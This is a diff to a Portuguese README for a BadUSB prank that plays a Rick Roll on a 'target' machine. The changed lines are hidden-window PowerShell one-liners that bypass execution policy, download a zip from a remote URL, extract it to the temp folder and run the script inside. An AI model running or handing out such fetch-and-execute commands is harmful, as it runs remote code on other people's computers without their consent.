@@ -44,7 +44,7 @@ Este programa executa um Rick Roll completo no alvo:
 * Conecte o dispositivo BadUSB ou execute o comando na caixa Executar (`Win + R`):
 
 ```powershell
-powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des "$D\rr" -Force;. "$D\rr\rr.ps1"
 ```
 
 ## Modifications & Improvements
